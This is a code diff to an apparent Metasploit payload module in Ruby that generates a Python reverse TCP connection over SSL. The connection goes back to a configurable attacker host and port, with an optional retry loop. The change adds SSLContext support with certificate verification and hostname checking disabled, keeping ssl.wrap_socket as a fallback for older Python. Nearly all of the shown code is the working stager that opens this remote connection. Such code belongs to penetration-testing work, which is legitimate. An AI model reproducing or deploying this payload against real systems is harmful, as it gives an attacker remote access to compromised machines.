@@ -44,12 +44,19 @@ module Payload::Python::ReverseTcpSsl
   end
 
   def generate_reverse_tcp_ssl(opts={})
-    # Set up the socket
+    # Set up the socket - use ssl.SSLContext for Python 3.2+ compatibility
+    # Fallback to ssl.wrap_socket for Python 2.x
     cmd  = "import zlib,base64,ssl,socket,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
     if opts[:retry_wait].blank? # do not retry at all (old style)
       cmd << "so=socket.socket(2,1)\n" # socket.AF_INET = 2
       cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
-      cmd << "s=ssl.wrap_socket(so)\n"
+      cmd << "if hasattr(ssl,'SSLContext'):\n"
+      cmd << "\tctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n"
+      cmd << "\tctx.check_hostname=False\n"
+      cmd << "\tctx.verify_mode=ssl.CERT_NONE\n"
+      cmd << "\ts=ctx.wrap_socket(so)\n"
+      cmd << "else:\n"
+      cmd << "\ts=ssl.wrap_socket(so)\n"
     else
       if opts[:retry_count] > 0
         cmd << "for x in range(#{opts[:retry_count].to_i}):\n"
@@ -59,7 +66,13 @@ module Payload::Python::ReverseTcpSsl
       cmd << "\ttry:\n"
       cmd << "\t\tso=socket.socket(2,1)\n" # socket.AF_INET = 2
       cmd << "\t\tso.connect(('#{opts[:host]}',#{opts[:port]}))\n"
-      cmd << "\t\ts=ssl.wrap_socket(so)\n"
+      cmd << "\t\tif hasattr(ssl,'SSLContext'):\n"
+      cmd << "\t\t\tctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n"
+      cmd << "\t\t\tctx.check_hostname=False\n"
+      cmd << "\t\t\tctx.verify_mode=ssl.CERT_NONE\n"
+      cmd << "\t\t\ts=ctx.wrap_socket(so)\n"
+      cmd << "\t\telse:\n"
+      cmd << "\t\t\ts=ssl.wrap_socket(so)\n"
       cmd << "\t\tbreak\n"
       cmd << "\texcept:\n"
       if opts[:retry_wait].to_i <= 0
@@ -85,4 +98,3 @@ module Payload::Python::ReverseTcpSsl
 end
 
 end
-
